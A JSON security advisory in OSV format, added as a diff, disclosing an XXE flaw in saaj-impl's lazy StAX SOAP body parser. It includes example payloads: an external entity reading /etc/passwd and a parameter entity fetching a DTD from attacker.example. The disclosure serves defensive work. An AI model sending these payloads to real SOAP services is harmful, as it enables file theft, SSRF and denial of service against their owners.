@@ -1,0 +1,48 @@
+{
+  "id": "CGP-76vm-gg49-hx7p",
+  "schema_version": "1.6.0",
+  "summary": "Unhardened XMLInputFactory in lazy StAX SOAP body path enables XXE file read, SSRF, and DoS when saaj.lazy.soap.body is enabled",
+  "details": "### Root Cause\n\n`EnvelopeFactory.parseEnvelopeStax()` (called when `soapPart.message.isLazySoapBodyParsing()` returns `true`) obtains an `XMLInputFactory` via `XMLInputFactory.newInstance()` at line 118 without configuring any security properties:\n\n```\nif (xmlInputFactory == null) xmlInputFactory = XMLInputFactory.newInstance();\nstreamReader = xmlInputFactory.createXMLStreamReader(src);\n```\n\nThe factory is stored in the static field `xmlInputFactory` and reused. Neither `XMLInputFactory.SUPPORT_DTD` nor `XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES` is set to `false`, and `FEATURE_SECURE_PROCESSING` is not applied. StAX factories are not covered by JAXP's `FEATURE_SECURE_PROCESSING` flag, so the default factory retains full DTD and external-entity resolution capability.\n\nThe default SAX path (`parseEnvelopeSax`) wraps the input in a `RejectDoctypeSaxFilter` (a `LexicalHandler` that throws on `startDTD()`), but this filter is never applied in the StAX path. The lazy-body property is a documented, programmatic feature that frameworks such as JAX-WS RI/Metro may enable.\n\n### Affected Locations\n\n- `com.sun.xml.messaging.saaj.soap.EnvelopeFactory.parseEnvelopeStax()` at line 118 of `src/main/java/com/sun/xml/messaging/saaj/soap/EnvelopeFactory.java`: the `XMLInputFactory.newInstance().createXMLStreamReader(src)` call is the sink. The static `xmlInputFactory` field is initialized without any security properties on first use.\n\n### Attack Vectors\n\n**External file read via DOCTYPE SYSTEM entity:**\nAn attacker submits a SOAP envelope containing a DOCTYPE declaration with a SYSTEM entity referencing a local file:\n```xml\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><S:Envelope ...><S:Body>&xxe;</S:Body></S:Envelope>\n```\nThe unhardened StAX parser resolves the entity and includes the file contents in the parsed document.\n\n**SSRF via parameter-entity fetching:**\nAn attacker uses a parameter entity in the DTD subset to trigger an outbound HTTP request from the server:\n```xml\n<!DOCTYPE foo [<!ENTITY % ext SYSTEM \"http://attacker.example/evil.dtd\"> %ext;]>\n```\nThe parser fetches the external DTD, enabling server-side request forgery to internal services.\n\n**Billion-laughs entity-expansion DoS:**\nAn attacker submits a document with deeply nested internal entity references. Because `SUPPORT_DTD` is not disabled, the parser expands the entity tree, consuming JVM heap and CPU until `OutOfMemoryError` or process termination.\n\n**Alternate protocol handlers (jar:, netdoc:):**\nThe `SYSTEM` URI in a DOCTYPE can use `jar:` or `netdoc:` scheme handlers registered in the JVM, potentially escalating file-read to SSRF or contributing to gadget chains on vulnerable stacks.\n\n### Prerequisite\n\nThe consuming application or framework must set the `saaj.lazy.soap.body` property to `true` on the `SOAPMessage` before the envelope is materialized. This is a documented, programmatic opt-in feature.\n\n### Impact\n\nAn attacker who can submit a crafted SOAP envelope to an endpoint where the lazy-body property is enabled can:\n- Read arbitrary local files accessible to the JVM process (confidentiality impact: High)\n- Trigger outbound network requests to internal services (SSRF)\n- Cause a denial-of-service via entity-expansion (availability impact: High)\n\n### Trace\n\n`MessageFactoryImpl.createMessage(MimeHeaders, InputStream)` → `MessageImpl.init()` → `SOAPPart.setContent(new StreamSource(in))` → [application calls `msg.setProperty(\"saaj.lazy.soap.body\", true)`] → `SOAPPart.getEnvelope()` → `EnvelopeFactory.createEnvelope()` → `isLazySoapBodyParsing() == true` → `parseEnvelopeStax(src, soapPart)` → `XMLInputFactory.newInstance()` (no `SUPPORT_DTD=false`, no `IS_SUPPORTING_EXTERNAL_ENTITIES=false`, no `FEATURE_SECURE_PROCESSING`) → `createXMLStreamReader(attacker XML)`",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:H/E:X/RL:X/RC:R"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Maven",
+        "name": "com.sun.xml.messaging.saaj:saaj-impl",
+        "purl": "pkg:maven/com.sun.xml.messaging.saaj/saaj-impl"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "1.3.23"
+            },
+            {
+              "fixed": "3.0.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-611"
+        ],
+        "sink_locator": [
+          {
+            "class": "com.sun.xml.messaging.saaj.soap.EnvelopeFactory",
+            "method": "createXMLStreamReader(Source)",
+            "file_line": "src/main/java/com/sun/xml/messaging/saaj/soap/EnvelopeFactory.java:118"
+          }
+        ]
+      }
+    }
+  ],
+  "published": "2026-11-12T16:00:00Z",
+  "modified": "2026-11-12T16:00:00Z"
+}
